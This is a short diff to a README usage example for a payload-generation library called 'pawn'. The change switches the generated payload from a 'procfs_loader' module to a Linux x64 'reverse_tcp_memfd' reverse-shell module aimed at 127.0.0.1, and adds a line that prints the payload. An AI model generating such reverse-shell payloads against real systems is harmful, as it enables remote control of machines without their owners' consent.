@@ -23,8 +23,8 @@ from pawn import Pawn
 
 pawn = Pawn()
 
-payload = pawn.get_pawn(
-    module='linux/x64/procfs_loader',
+payload, send_size = pawn.get_pawn(
+    module='linux/x64/reverse_tcp_memfd',
     platfrom='linux',
     arch='x64',
     host='127.0.0.1',
@@ -32,6 +32,7 @@ payload = pawn.get_pawn(
 )
 
 print(len(payload))
+print(payload)
 ```
 
 ## Special Thanks
